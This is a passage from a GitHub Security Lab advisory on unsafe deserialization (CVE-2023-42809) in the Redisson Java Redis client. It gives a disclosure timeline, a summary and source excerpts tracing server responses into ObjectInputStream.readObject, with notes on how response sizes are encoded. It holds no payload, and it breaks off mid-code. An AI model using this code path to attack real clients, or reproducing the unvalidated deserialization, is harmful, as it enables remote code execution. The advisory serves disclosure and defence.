<!DOCTYPE html>
<html lang="en">

<head>
    <!-- META DATA -->
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="preload" href="/assets/css/index.css" as="style">
    <link rel="preload" href="/assets/js/main.js" as="script">
    <!--[if IE]><meta http-equiv="cleartype" content="on" /><![endif]-->
    <link rel="canonical" href="https://securitylab.github.com/advisories/GHSL-2023-053_Redisson/">
    <link rel="alternate" type="application/rss+xml" title="GitHub Security Lab" href="/feed.xml">
    <link rel="stylesheet" media="screen" href="/assets/css/index.css" />
    <script async src="https://js.maxmind.com/js/apis/geoip2/v2.1/geoip2.js"></script>
    <script src="/assets/js/jquery.js"></script>
    <link id="favicon" rel="shortcut icon" type="image/ico" href="/assets/img/favicons/favicon.png" />
    <link rel="apple-touch-icon" href="/assets/img/favicons/apple-touch-icon.png" />
    <link rel="icon" href="/assets/img/favicons/android-favicon.png">
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>GHSL-2023-053: Unsafe deserialization in Redisson - CVE-2023-42809 | GitHub Security Lab</title>
<meta name="generator" content="Jekyll v4.3.4" />
<meta property="og:title" content="GHSL-2023-053: Unsafe deserialization in Redisson - CVE-2023-42809" />
<meta name="author" content="team" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Redisson is a Java Redis client that uses the Netty framework. Some of the messages received from the Redis server contain Java objects that the client deserializes without further validation. Attackers that manage to trick clients into communicating with a malicious server can include especially crafted objects in its responses that, once deserialized by the client, force it to execute arbitrary code. This can be abused to take control of the machine the client is running in." />
<meta property="og:description" content="Redisson is a Java Redis client that uses the Netty framework. Some of the messages received from the Redis server contain Java objects that the client deserializes without further validation. Attackers that manage to trick clients into communicating with a malicious server can include especially crafted objects in its responses that, once deserialized by the client, force it to execute arbitrary code. This can be abused to take control of the machine the client is running in." />
<link rel="canonical" href="https://securitylab.github.com/advisories/GHSL-2023-053_Redisson/" />
<meta property="og:url" content="https://securitylab.github.com/advisories/GHSL-2023-053_Redisson/" />
<meta property="og:site_name" content="GitHub Security Lab" />
<meta property="og:image" content="https://securitylab.github.com/assets/img/social-card.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-09-27T00:00:00+00:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="https://securitylab.github.com/assets/img/social-card.png" />
<meta property="twitter:title" content="GHSL-2023-053: Unsafe deserialization in Redisson - CVE-2023-42809" />
<meta name="twitter:site" content="@GHSecurityLab" />
<meta name="twitter:creator" content="@team" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"team"},"dateModified":"2023-09-27T00:00:00+00:00","datePublished":"2023-09-27T00:00:00+00:00","description":"Redisson is a Java Redis client that uses the Netty framework. Some of the messages received from the Redis server contain Java objects that the client deserializes without further validation. Attackers that manage to trick clients into communicating with a malicious server can include especially crafted objects in its responses that, once deserialized by the client, force it to execute arbitrary code. This can be abused to take control of the machine the client is running in.","headline":"GHSL-2023-053: Unsafe deserialization in Redisson - CVE-2023-42809","image":"https://securitylab.github.com/assets/img/social-card.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://securitylab.github.com/advisories/GHSL-2023-053_Redisson/"},"url":"https://securitylab.github.com/advisories/GHSL-2023-053_Redisson/"}</script>
<!-- End Jekyll SEO tag -->

    
    <meta name="ha-url" content="https://collector.githubapp.com/securitylab-website/collect">
    <script src="https://analytics.githubassets.com/hydro-marketing.min.js"></script>
</head>
  


<body class="no-js page-/advisories/GHSL-2023-053_Redisson page-blog">
  <a class="skip-to-content" href="#content">skip to content</a>

  <div
  id="site-navigation-container"
  class="site-navigation-container position-fixed top-0 width-full color-bg-transparent"
>
  <div
    className="position-relative site-navigation-container--background hide-sm hide-md"
  >
    <nav class="site-navigation nav d-block">
      <div
        class="container-xl py-2 d-none d-lg-flex flex-items-center flex-justify-between gap-0"
      >
        <a
          role="tab"
          title="Github"
          class="nav-logo"
          href="https://github.com"
          target="_blank"
        >
          <svg
            aria-hidden="true"
            role="img"
            class="nav-back-arrow position-absolute"
            viewBox="0 0 24 24"
            width="32"
            height="32"
            fill="currentColor"
            style="
              display: inline-block;
              user-select: none;
              vertical-align: text-bottom;
              overflow: visible;
            "
          >
            <path
              fill-rule="evenodd"
              d="M15.28 5.22a.75.75 0 00-1.06 0l-6.25 6.25a.75.75 0 000 1.06l6.25 6.25a.75.75 0 101.06-1.06L9.56 12l5.72-5.72a.75.75 0 000-1.06z"
            ></path>
          </svg>
          <svg
            height="32"
            class="octicon octicon-mark-github mr-2"
            viewBox="0 0 16 16"
            version="1.1"
            width="32"
            aria-hidden="true"
          >
            <path
              fill-rule="evenodd"
              d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0 0 16 8c0-4.42-3.58-8-8-8z"
            ></path>
          </svg>
        </a>
        <span class="Slash-item"> / </span>
        <a
          aria-current="page"
          role="tab"
          title="Security Lab"
          class="nav-item nav-item--logo"
          href="/"
          >Security Lab</a
        >

        <div
          class="nav-body flex-auto flex-justify-start hide-sm hide-md"
          role="tablist"
        >
          <a
            role="tab"
            title="Research"
            class="nav-item"
            href="https://github.blog/tag/github-security-lab/"
            target="_blank"
            >Research</a
          >
          <a
            role="tab"
            title="Advisories"
            class="nav-item"
            href="/advisories/"
            >Advisories</a
          >
          <a
            role="tab"
            title="CodeQL Wall of Fame"
            class="nav-item"
            href="/codeql-wall-of-fame/"
            >CodeQL Wall of Fame</a
          >
          <button
            aria-label="Menu"
            aria-expanded="false"
            class="nav-item nav-item-button js-dropdown-menu-trigger"
          >
            Resources
          </button>
          <a
            role="tab"
            title="Events"
            class="nav-item"
            href="/events/"
            >Events</a
          >
        </div>

        <a
          href="/get-involved/"
          class="btn-get-involved hide-sm hide-md"
          ><span>Get Involved</span></a
        >
      </div>
    </nav>
  </div>

  <div
    class="navigation-dropdown left-0 width-full position-absolute color-bg-dark py-6"
  >
    <ul class="container-xl py-5 site-navigation__dropdown">
      <li class="pb-4 dropdown-title col-4">Resources</li>
      <li class="dropdown-nav-item col-4 py-2">
        <a
          role="tab"
          title="Home"
          class=" "
          href="/open-source"
          >Open Source Community</a
        >
      </li>
      <li class="dropdown-nav-item col-4 py-2">
        <a
          role="tab"
          title="Home"
          class=""
          href="/enterprise"
          >Enterprise</a
        >
      </li>
    </ul>
  </div>
</div>

<div
  class="mobile-navbar hide-lg hide-xl d-flex flex-items-center flex-justify-start"
>
  <a
    role="tab"
    title="Github"
    class="nav-logo"
    href="https://github.com"
    target="_blank"
  >
    <svg
      height="32"
      class="octicon octicon-mark-github mr-2"
      viewBox="0 0 16 16"
      version="1.1"
      width="32"
      aria-hidden="true"
    >
      <path
        fill-rule="evenodd"
        d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0 0 16 8c0-4.42-3.58-8-8-8z"
      ></path>
    </svg>
  </a>
  <span class="Slash-item"> / </span>
  <a
    aria-current="page"
    role="tab"
    title="Security Lab"
    class="top-nav-item nav-item nav-item--logo"
    href="/"
    >Security Lab</a
  >
  <button
    aria-label="Menu"
    aria-expanded="false"
    class="sc-VigVT sc-jzJRlG nav-dropdown js-menu-trigger"
  >
    <svg
      class="caret-button"
      width="14"
      height="9"
      viewBox="0 0 14 9"
      fill="none"
      xmlns="http://www.w3.org/2000/svg"
    >
      <path
        fill-rule="evenodd"
        clip-rule="evenodd"
        d="M13.7803 0.71967C14.0732 1.01256 14.0732 1.48744 13.7803 1.78033L7.53033 8.03033C7.23744 8.32322 6.76256 8.32322 6.46967 8.03033L0.21967 1.78033C-0.0732231 1.48744 -0.0732231 1.01256 0.21967 0.71967C0.512563 0.426777 0.987437 0.426777 1.28033 0.71967L7 6.43934L12.7197 0.71967C13.0126 0.426777 13.4874 0.426777 13.7803 0.71967Z"
        fill="#24292F"
      />
    </svg>
  </button>

  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const toggleNavBtn = document.querySelector(".nav-dropdown");
      const mobileNav = document.querySelector(".mobile-nav");
      const caretIcon = document.querySelector(".caret-button");
      const backdrop = document.querySelector(".mobile-nav-screen");
      function toggleNavigation(event) {
        event.preventDefault();
        const expanded = toggleNavBtn.getAttribute("aria-expanded") === "true";

        toggleNavBtn.setAttribute("aria-expanded", !expanded);
        mobileNav.classList.toggle("expanded", !expanded);
        backdrop.classList.toggle("active", !expanded);

      }
      toggleNavBtn.addEventListener("click", toggleNavigation);
      toggleNavBtn.addEventListener("touchstart", toggleNavigation);

      backdrop.addEventListener("click", toggleNavigation);
      backdrop.addEventListener("touchstart", toggleNavigation);
    });
  </script>
</div>

<div class="mobile-nav">
  <div class="">
    <a
      role="tab"
      title="Research"
      class="nav-item "
      href="https://github.blog/tag/github-security-lab/"
      >Research</a
    >
    <a
      role="tab"
      title="Advisories"
      class="nav-item "
      href="/advisories/"
      >Advisories</a
    >
    <a
      role="tab"
      title="CodeQL Wall of Fame"
      class="nav-item "
      href="/codeql-wall-of-fame/"
      >CodeQL Wall of Fame</a
    >
    <div class="nav-item resources">
      <div
        class="nav-dropdown-item d-flex flex-justify-between flex-items-center"
      >
        <span>Resources</span>
        <svg
          class="mobile-caret"
          width="12"
          height="7"
          viewBox="0 0 12 7"
          fill="none"
          xmlns="http://www.w3.org/2000/svg"
        >
          <path
            fill-rule="evenodd"
            clip-rule="evenodd"
            d="M11.6502 0.266554C11.8943 0.510632 11.8943 0.90636 11.6502 1.15044L6.44186 6.35877C6.19778 6.60285 5.80205 6.60285 5.55798 6.35877L0.349644 1.15044C0.105566 0.90636 0.105566 0.510632 0.349644 0.266554C0.593721 0.0224767 0.98945 0.0224767 1.23353 0.266554L5.99992 5.03295L10.7663 0.266554C11.0104 0.0224767 11.4061 0.0224767 11.6502 0.266554Z"
            fill="white"
          />
        </svg>
      </div>

      <div class="sub-menu">
        <a
          role="tab"
          title="Open Source Community"
          class="nav-inner-item "
          href="/open-source"
          >Open Source Community</a
        >
        <a
          role="tab"
          title="Enterprise"
          class="nav-inner-item "
          href="/enterprise"
          >Enterprise</a
        >
      </div>
    </div>
    <a
      role="tab"
      title="Events"
      class="nav-item "
      href="/events/"
      >Events</a
    >
    <a
      role="tab"
      title="Events"
      class="nav-item "
      href="/get-involved/"
      >Get Involved</a
    >
  </div>
  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const resources = document.querySelector(".nav-item.resources");
      const caret = resources.querySelector(".mobile-caret");
      const subMenu = resources.querySelector(".sub-menu");

      resources.addEventListener("click", function () {
        resources.classList.toggle("active");

        if (resources.classList.contains("active")) {
          // Force reflow
          subMenu.style.maxHeight = subMenu.scrollHeight + "px";
          subMenu.style.opacity = 1;
        } else {
          // Force reflow
          subMenu.style.maxHeight = "0";
          subMenu.style.opacity = 0;
        }
      });
    });
  </script>
</div>
<span class="mobile-nav-screen js-menu-trigger"></span>

<span class="dropdown-nav-screen js-dropdown-menu-trigger"></span>


  <div class="container-xl post-container p-responsive mt-md-76">
    <header class="post-header ">
      <div class="date text-mono mb-3 mb-md-2">September 27, 2023</div>
      <h1 class="page-title mb-3 mb-md-4 ">GHSL-2023-053: Unsafe deserialization in Redisson - CVE-2023-42809</h1>

      
      
      
      
      

      

      <a target="_blank" class="mx-auto sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/ghsecuritylab">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/61799930" alt="Author avatar" height="35" width="35">
        <span>Tony Torralba, Joseph Farebrother</span>
      </a>
    </header>

    <main id="content" class="markdown-body post-content" aria-label="Content">
      
<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>2023-03-28: Report sent to info@redisson.pro</li>
  <li>2023-03-28: Report is acknowledged</li>
  <li>2023-06-01: <a href="https://github.com/redisson/redisson/commit/fe6a2571801656ff1599ef87bdee20f519a5d1fe">Fix</a> is commited</li>
  <li>2023-06-27: Deadline expires</li>
  <li>2023-06-29: We reiterate some concerns to the maintainer, who decides not to address them. Please check <code class="language-plaintext highlighter-rouge">Post-fix advice</code> below.</li>
</ul>

<h2 id="summary">Summary</h2>

<p>Redisson is a Java Redis client that uses the Netty framework. Some of the messages received from the Redis server contain Java objects that the client deserializes without further validation. Attackers that manage to trick clients into communicating with a malicious server can include especially crafted objects in its responses that, once deserialized by the client, force it to execute arbitrary code. This can be abused to take control of the machine the client is running in.</p>

<h2 id="product">Product</h2>

<p>Redisson</p>

<h2 id="tested-version">Tested Version</h2>

<p><a href="https://github.com/redisson/redisson/releases/tag/redisson-3.20.0">3.20.0</a></p>

<h2 id="details">Details</h2>

<h3 id="unsafe-deserialization-of-server-responses-ghsl-2023-053">Unsafe deserialization of server responses (<code class="language-plaintext highlighter-rouge">GHSL-2023-053</code>)</h3>

<p>When being set up, Redisson can be configured to use a specific <code class="language-plaintext highlighter-rouge">Codec</code> to encode and decode messages. If <code class="language-plaintext highlighter-rouge">SerializationCodec</code> is used, unsafe deserialization may happen as part of an object request made to the server.</p>

<p>When a Netty channel is established with a server, <code class="language-plaintext highlighter-rouge">RedisChannelInitializer.initChannel</code> is executed, which sets up <code class="language-plaintext highlighter-rouge">CommandDecoder</code> to decode incoming messages:</p>

<p><a href="https://github.com/redisson/redisson/blob/ccfa6c21d022943180bb6c676082cc1d56472fbb/redisson/src/main/java/org/redisson/client/handler/RedisChannelInitializer.java#L99"><code class="language-plaintext highlighter-rouge">redisson/src/main/java/org/redisson/client/handler/RedisChannelInitializer.java:99</code></a></p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@Override</span>
<span class="kd">protected</span> <span class="kt">void</span> <span class="nf">initChannel</span><span class="o">(</span><span class="nc">Channel</span> <span class="n">ch</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
    <span class="c1">// --snip--</span>

    <span class="k">if</span> <span class="o">(</span><span class="n">type</span> <span class="o">==</span> <span class="nc">Type</span><span class="o">.</span><span class="na">PLAIN</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">ch</span><span class="o">.</span><span class="na">pipeline</span><span class="o">().</span><span class="na">addLast</span><span class="o">(</span><span class="k">new</span> <span class="nc">CommandDecoder</span><span class="o">(</span><span class="n">config</span><span class="o">.</span><span class="na">getAddress</span><span class="o">().</span><span class="na">getScheme</span><span class="o">()));</span>
    <span class="o">}</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">CommandDecoder.decode</code> will then be invoked when the server sends a message to the client:</p>

<p><a href="https://github.com/redisson/redisson/blob/ccfa6c21d022943180bb6c676082cc1d56472fbb/redisson/src/main/java/org/redisson/client/handler/CommandDecoder.java#L78"><code class="language-plaintext highlighter-rouge">redisson/src/main/java/org/redisson/client/handler/CommandDecoder.java:78</code></a></p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@Override</span>
<span class="kd">protected</span> <span class="kd">final</span> <span class="kt">void</span> <span class="nf">decode</span><span class="o">(</span><span class="nc">ChannelHandlerContext</span> <span class="n">ctx</span><span class="o">,</span> <span class="nc">ByteBuf</span> <span class="n">in</span><span class="o">,</span> <span class="nc">List</span><span class="o">&lt;</span><span class="nc">Object</span><span class="o">&gt;</span> <span class="n">out</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
    <span class="c1">// --snip--</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">data</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">while</span> <span class="o">(</span><span class="n">in</span><span class="o">.</span><span class="na">writerIndex</span><span class="o">()</span> <span class="o">&gt;</span> <span class="n">in</span><span class="o">.</span><span class="na">readerIndex</span><span class="o">())</span> <span class="o">{</span>
            <span class="c1">// --snip--</span>
            <span class="k">try</span> <span class="o">{</span>
                <span class="n">decode</span><span class="o">(</span><span class="n">ctx</span><span class="o">,</span> <span class="n">in</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
            <span class="o">}</span>
            <span class="c1">// --snip--</span>
        <span class="o">}</span>
    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
        <span class="c1">// --snip--</span>
        <span class="n">decode</span><span class="o">(</span><span class="n">ctx</span><span class="o">,</span> <span class="n">in</span><span class="o">,</span> <span class="n">data</span><span class="o">,</span> <span class="n">endIndex</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>

<span class="kd">private</span> <span class="kt">void</span> <span class="nf">decode</span><span class="o">(</span><span class="nc">ChannelHandlerContext</span> <span class="n">ctx</span><span class="o">,</span> <span class="nc">ByteBuf</span> <span class="n">in</span><span class="o">,</span> <span class="nc">QueueCommand</span> <span class="n">data</span><span class="o">,</span> <span class="kt">int</span> <span class="n">endIndex</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
    <span class="c1">// --snip--</span>
    <span class="n">decodeCommand</span><span class="o">(</span><span class="n">ctx</span><span class="o">.</span><span class="na">channel</span><span class="o">(),</span> <span class="n">in</span><span class="o">,</span> <span class="n">data</span><span class="o">,</span> <span class="n">endIndex</span><span class="o">);</span>
<span class="o">}</span>

<span class="nd">@Override</span>
<span class="kd">protected</span> <span class="kt">void</span> <span class="nf">decodeCommand</span><span class="o">(</span><span class="nc">Channel</span> <span class="n">channel</span><span class="o">,</span> <span class="nc">ByteBuf</span> <span class="n">in</span><span class="o">,</span> <span class="nc">QueueCommand</span> <span class="n">data</span><span class="o">,</span> <span class="kt">int</span> <span class="n">endIndex</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">data</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="k">while</span> <span class="o">(</span><span class="n">in</span><span class="o">.</span><span class="na">writerIndex</span><span class="o">()</span> <span class="o">&gt;</span> <span class="n">in</span><span class="o">.</span><span class="na">readerIndex</span><span class="o">())</span> <span class="o">{</span>
                <span class="n">decode</span><span class="o">(</span><span class="n">in</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">channel</span><span class="o">,</span> <span class="kc">false</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
            <span class="o">}</span>
            <span class="c1">// --snip--</span>
        <span class="o">}</span>
        <span class="c1">// --snip--</span>
    <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">data</span> <span class="k">instanceof</span> <span class="nc">CommandData</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">CommandData</span><span class="o">&lt;</span><span class="nc">Object</span><span class="o">,</span> <span class="nc">Object</span><span class="o">&gt;</span> <span class="n">cmd</span> <span class="o">=</span> <span class="o">(</span><span class="nc">CommandData</span><span class="o">&lt;</span><span class="nc">Object</span><span class="o">,</span> <span class="nc">Object</span><span class="o">&gt;)</span> <span class="n">data</span><span class="o">;</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="k">while</span> <span class="o">(</span><span class="n">in</span><span class="o">.</span><span class="na">writerIndex</span><span class="o">()</span> <span class="o">&gt;</span> <span class="n">in</span><span class="o">.</span><span class="na">readerIndex</span><span class="o">())</span> <span class="o">{</span>
                <span class="n">decode</span><span class="o">(</span><span class="n">in</span><span class="o">,</span> <span class="n">cmd</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">channel</span><span class="o">,</span> <span class="kc">false</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="c1">// --snip--</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>

<span class="kd">protected</span> <span class="kt">void</span> <span class="nf">decode</span><span class="o">(</span><span class="nc">ByteBuf</span> <span class="n">in</span><span class="o">,</span> <span class="nc">CommandData</span><span class="o">&lt;</span><span class="nc">Object</span><span class="o">,</span> <span class="nc">Object</span><span class="o">&gt;</span> <span class="n">data</span><span class="o">,</span> <span class="nc">List</span><span class="o">&lt;</span><span class="nc">Object</span><span class="o">&gt;</span> <span class="n">parts</span><span class="o">,</span> <span class="nc">Channel</span> <span class="n">channel</span><span class="o">,</span> <span class="kt">boolean</span> <span class="n">skipConvertor</span><span class="o">,</span> <span class="nc">List</span><span class="o">&lt;</span><span class="nc">CommandData</span><span class="o">&lt;?,</span> <span class="o">?&gt;&gt;</span> <span class="n">commandsData</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">IOException</span> <span class="o">{</span>
    <span class="kt">int</span> <span class="n">code</span> <span class="o">=</span> <span class="n">in</span><span class="o">.</span><span class="na">readByte</span><span class="o">();</span>
    <span class="c1">// --snip--</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">code</span> <span class="o">==</span> <span class="sc">'$'</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">ByteBuf</span> <span class="n">buf</span> <span class="o">=</span> <span class="n">readBytes</span><span class="o">(</span><span class="n">in</span><span class="o">);</span>
</code></pre></div></div>

<p>As it can be seen, the input buffer <code class="language-plaintext highlighter-rouge">in</code> goes through many layers of methods, and then a byte is read from it: if that byte is <code class="language-plaintext highlighter-rouge">$</code>, then the rest of the message is parsed by <code class="language-plaintext highlighter-rouge">readBytes</code>:</p>

<p><a href="https://github.com/redisson/redisson/blob/ccfa6c21d022943180bb6c676082cc1d56472fbb/redisson/src/main/java/org/redisson/client/handler/CommandDecoder.java#L493"><code class="language-plaintext highlighter-rouge">redisson/src/main/java/org/redisson/client/handler/CommandDecoder.java:493</code></a></p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="nc">ByteBuf</span> <span class="nf">readBytes</span><span class="o">(</span><span class="nc">ByteBuf</span> <span class="n">is</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">IOException</span> <span class="o">{</span>
    <span class="kt">long</span> <span class="n">l</span> <span class="o">=</span> <span class="n">readLong</span><span class="o">(</span><span class="n">is</span><span class="o">);</span>
    <span class="c1">// --snip--</span>
    <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="o">(</span><span class="kt">int</span><span class="o">)</span> <span class="n">l</span><span class="o">;</span>
    <span class="c1">// --snip--</span>
    <span class="nc">ByteBuf</span> <span class="n">buffer</span> <span class="o">=</span> <span class="n">is</span><span class="o">.</span><span class="na">readSlice</span><span class="o">(</span><span class="n">size</span><span class="o">);</span>
    <span class="kt">int</span> <span class="n">cr</span> <span class="o">=</span> <span class="n">is</span><span class="o">.</span><span class="na">readByte</span><span class="o">();</span>
    <span class="kt">int</span> <span class="n">lf</span> <span class="o">=</span> <span class="n">is</span><span class="o">.</span><span class="na">readByte</span><span class="o">();</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">cr</span> <span class="o">!=</span> <span class="no">CR</span> <span class="o">||</span> <span class="n">lf</span> <span class="o">!=</span> <span class="no">LF</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nf">IOException</span><span class="o">(</span><span class="s">"Improper line ending: "</span> <span class="o">+</span> <span class="n">cr</span> <span class="o">+</span> <span class="s">", "</span> <span class="o">+</span> <span class="n">lf</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="k">return</span> <span class="n">buffer</span><span class="o">;</span>
</code></pre></div></div>

<p>In <code class="language-plaintext highlighter-rouge">readBytes</code>, a long indicating the payload size is read from the buffer. By examining the <code class="language-plaintext highlighter-rouge">readLong</code> method, it can be determined that it’s in fact read as base 10 integers until a <code class="language-plaintext highlighter-rouge">CRLF</code> sequence is found, so, for instance, to send a size of 300, one would need to send the bytes <code class="language-plaintext highlighter-rouge">0x03 0x00 0x00</code>, instead of the actual long <code class="language-plaintext highlighter-rouge">0x00 0x00 0x00 0x00 0x00 0x00 0x12 0x63</code>).</p>

<p>After that, that same amount of bytes is read from the input buffer, and then a <code class="language-plaintext highlighter-rouge">CRLF</code> sequence is expected to end the message.</p>

<p>If all is correct, the execution continues in <code class="language-plaintext highlighter-rouge">CommandDecoder.decode</code>:</p>

<p><a href="https://github.com/redisson/redisson/blob/ccfa6c21d022943180bb6c676082cc1d56472fbb/redisson/src/main/java/org/redisson/client/handler/CommandDecoder.java#L389"><code class="language-plaintext highlighter-rouge">redisson/src/main/java/org/redisson/client/handler/CommandDecoder.java:389</code></a></p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">ByteBuf</span> <span class="n">buf</span> <span class="o">=</span> <span class="n">readBytes</span><span class="o">(</span><span class="n">in</span><span class="o">);</span>
<span class="nc">Object</span> <span class="n">result</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
<span class="k">if</span> <span class="o">(</span><span class="n">buf</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
    <span class="nc">Decoder</span><span class="o">&lt;</span><span class="nc">Object</span><span class="o">&gt;</span> <span class="n">decoder</span> <span class="o">=</span> <span class="n">selectDecoder</span><span class="o">(</span><span class="n">data</span><span class="o">,</span> <span class="n">parts</span><span class="o">);</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">decoder</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="n">buf</span><span class="o">,</span> <span class="n">state</span><span class="o">());</span>
<span class="o">}</span>
</code></pre></div></div>

<p>A <code class="language-plaintext highlighter-rouge">Decoder</code> is selected based on the command that the client issued. Since we’re requesting an object through <code class="language-plaintext highlighter-rouge">getMap</code>, <code class="language-plaintext highlighter-rouge">SerializationCodec$Decoder.decode</code> is used:</p>

<p><a href="https://github.com/redisson/redisson/blob/ccfa6c21d022943180bb6c676082cc1d56472fbb/redisson/src/main/java/org/redisson/codec/SerializationCodec.java#L40"><code class="language-plaintext highlighter-rouge">redisson/src/main/java/org/redisson/codec/SerializationCodec.java:40</code></a></p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">SerializationCodec</span> <span class="kd">extends</span> <span class="nc">BaseCodec</span> <span class="o">{</span>

    <span class="kd">private</span> <span class="kd">final</span> <span class="nc">Decoder</span><span class="o">&lt;</span><span class="nc">Object</span><span class="o">&gt;</span> <span class="n">decoder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Decoder</span><span class="o">&lt;</span><span class="nc">Object</span><span class="o">&gt;()</span> <span class="o">{</span>
        <span class="nd">@Override</span>
        <span class="kd">public</span> <span class="nc">Object</span> <span class="nf">decode</span><span class="o">(</span><span class="nc">ByteBuf</span> <span class="n">buf</span><span class="o">,</span> <span class="nc">State</span> <span class="n">state</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">IOException</span> <span class="o">{</span>
            <span class="c1">// --snip --</span>
            <span class="k">try</span> <span class="o">{</span>
                <span class="nc">ByteBufInputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ByteBufInputStream</span><span class="o">(</span><span class="n">buf</span><span class="o">);</span>
                <span class="nc">ObjectInputStream</span> <span class="n">inputStream</span><span class="o">;</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">classLoader</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                    <span class="nc">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">setContextClassLoader</span><span class="o">(</span><span class="n">classLoader</span><span class="o">);</span>
                    <span class="n">inputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">CustomObjectInputStream</span><span class="o">(</span><span class="n">classLoader</span><span class="o">,</span> <span class="n">in</span><span class="o">);</span>
                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                    <span class="n">inputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectInputStream</span><span class="o">(</span><span class="n">in</span><span class="o">);</span>
                <span class="o">}</span>
                <span class="k">return</span> <span class="n">inputStream</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
</code></pre></div></div>

